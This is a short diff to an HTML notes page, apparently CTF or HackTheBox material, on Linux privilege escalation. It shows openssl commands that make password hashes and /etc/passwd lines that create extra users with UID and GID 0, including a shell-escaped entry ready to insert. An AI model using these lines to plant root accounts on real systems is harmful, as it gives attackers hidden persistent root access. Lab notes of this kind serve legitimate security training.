@@ -13,4 +13,9 @@ You can now login with that password<br/>
 <br/>
 or just create a new user with UID and GID 0:<br/>
 openssl passwd -1 -salt ippsec hackthebox<br/>
-ippsec:$1$ojfoawijefoa;iwjfeoi:0:0:root:/root:/bin/bash</body></html>
+ippsec:$1$ojfoawijefoa;iwjfeoi:0:0:root:/root:/bin/bash<br/>
+<br/>
+openssl passwd -1 -salt reward1 hackthebox<br/>
+reward1:$1$reward1$H2gwNHo7p4.a/0N1S1Ct5/:0:0:root:/root:/bin/bash<br/>
+<br/>
+escaped: reward1:\$1\$reward1\$H2gwNHo7p4.a/0N1S1Ct5/:0:0:root:/root:/bin/bash</body></html>
